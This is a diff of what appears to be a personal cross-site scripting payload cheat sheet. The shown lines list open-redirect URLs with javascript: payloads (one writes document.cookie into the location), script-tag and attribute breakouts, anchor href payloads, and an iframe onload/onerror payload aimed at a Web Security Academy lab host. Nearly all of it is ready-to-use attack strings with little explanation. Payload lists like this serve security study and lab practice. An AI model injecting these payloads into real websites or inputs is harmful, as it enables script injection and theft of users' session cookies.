@@ -37,13 +37,16 @@ HTML HTML HTML entities test ===>
 &#x6c;&#x65;&#x65;&#x31;&#x30;&#x31;
 |||||||||||||||||||||||||||||||||||||||||||||
 
-===> OPEN Redirect
+===> OPEN Redirect URL
 http://url.com/?lee101=javascript://%250Alert(document.location=document.cookie)
-///////
+
+http://url.com/?evil='/><script>alert(1)</script>
+
 for anchor HREF inputs this payload to store <a src="javascript:alert(1)">LIKE website</a> ++++===>
 javascript:alert(1)
 http://foo?&apos;-alert(1)-&apos;
 
+|||||||||||||||||||||||||||||||||||||||||||||
 
 //// for seperate html page
 <iframe src="https://0a97007b03b5c853c0631f0600af003c.web-security-academy.net/" onload="this.src+='<img src=x onerror=print()>'"></iframe>
